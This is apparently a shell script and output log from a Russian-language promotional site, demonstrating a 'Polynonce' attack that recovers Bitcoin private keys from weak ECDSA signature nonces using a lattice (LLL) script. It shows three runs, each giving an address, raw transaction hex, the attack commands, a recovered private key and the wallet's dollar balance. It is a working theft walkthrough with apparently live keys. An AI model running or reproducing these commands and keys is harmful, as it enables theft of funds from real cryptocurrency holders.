~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

#!/bin/bash
# www.polynonce.ru
# Инновационные технологии, полный комплекс методов и средств для внедрения новшеств, цифровых товаров и услуг.
# POLYNONCE ATTACK используем подписи BITCOIN как полиному в произвольно высокой степени 128 bits для получение приватного ключа

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

https://btc1.trezor.io/address/1DxzwX4qC9PsWDSAzuWbJRzEwdGx3n9CJB

https://btc1.trezor.io/tx/929d565c386a279cf7a0382ba48cab1f72d62e7cfb3ab97b4f211d5673bc4441

chmod +x polynonce

./polynonce -list

-tool:   polynonce_attack

echo '02000000019e3de154f8b473a796b9e39dd279dff1d907a4d27a1d8b23a055f97b08ad4c6e310000006b483045022100b29bdfc27ddf6bebd0e77c84b31dc1bc64b5b2276c8d4147421e96ef85467e8d02204ddd8ff0ffa19658e3b417be5f64d9c425a4d9fcd76238b8538c1d605b229baf0121027b06fe78e39ced37586c42c9ac38d7b2d88ccdd4cd1bb38816c0933f9b8db695ffffffff0169020000000000001600145fc8e854994406f93ea5c7f3abccc5d319ae2a3100000000' > RawTX.txt

./polynonce -tool polynonce_attack -open RawTX.txt -save SignatureRSZ.csv

python3 crack_weak_ECDSA_nonces_with_LLL.py SignatureRSZ.csv 128 4

PrivateKey = f0a3e31646ce147bbd79bb6e45e6e9c8c4e51c535918c9b4cdca9528eb62172d

BitcoinAddress = 1DxzwX4qC9PsWDSAzuWbJRzEwdGx3n9CJB

BALANCE: $ 3699.40

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

https://btc1.trezor.io/address/137a6fqt13bhtAkGZWrgcGM98NLCotszR2

https://btc1.trezor.io/tx/c1da9d117e15883ba41539f558ac870f53865ea00f68a8ff8bc7e8a9ee67099b

chmod +x polynonce

./polynonce -list

-tool:   polynonce_attack

echo '010000000103ebc5c4b817124d45ad15e398ec32e9b9b7549c1fc10300ecbf36648c3cb5d42c0000006a47304402204e97dae0ab6e4eee9529f68687907c05db9037d9fbdba78dd01a3338a48d95b602207794cb7aa308243dfbdd5c20225777cd6e01bd7c4f76bf36948aa29290129c2b0121036360352efcff6a823eabb25578a29392eab4d302955fd54ece900578d2ab83b8ffffffff0162020000000000001976a914154813f71552c59487efa3b16d62bfb009dc5f1e88ac00000000' > RawTX.txt

./polynonce -tool polynonce_attack -open RawTX.txt -save SignatureRSZ.csv

python3 crack_weak_ECDSA_nonces_with_LLL.py SignatureRSZ.csv 128 4

PrivateKey = ff0178fa717374f7e74d43f00150748967ea04b64241ec10a10f62debb70868c

BitcoinAddress = 137a6fqt13bhtAkGZWrgcGM98NLCotszR2

BALANCE: $ 1133.73

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

https://btc1.trezor.io/address/1HxrEeC2X8UEcSvsemPJtTqrnbAetGWYUt

https://btc1.trezor.io/tx/fa80af660fc444d87853137506df02e5c75e8c2bf75dc44589b60356867a6d98

chmod +x polynonce

./polynonce -list

-tool:   polynonce_attack

echo '01000000016eb80d35b08164302e49f88d8f86bf2827a91a5650149be38f4f73751ff41437060000006a473044022043d4c025a0f3be366a0d768c721b9b9191e0c3db6f2c6bfe34e8fb24af7f379102205a4fe2cc6944e00309c35619ff1242301b84d4728b863f97326f56dbd7a782220121027ccccf5f56ed78c2a761721ff3da0f76b792fbe4eae2ac73e7b4651bc3ef19cdffffffff01c057010000000000232103bec42e5d718b0e5b3853243c9bcf00dd671a335b0eb99fd8ca32f8d5784a9476ac00000000' > RawTX.txt

./polynonce -tool polynonce_attack -open RawTX.txt -save SignatureRSZ.csv

python3 crack_weak_ECDSA_nonces_with_LLL.py SignatureRSZ.csv 128 4

PrivateKey = fbc50a7158b3d9fd7fd58fe0874f20c10c650975dc118163debf442a44203fdf

BitcoinAddress = 1HxrEeC2X8UEcSvsemPJtTqrnbAetGWYUt

BALANCE: $ 459.24

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
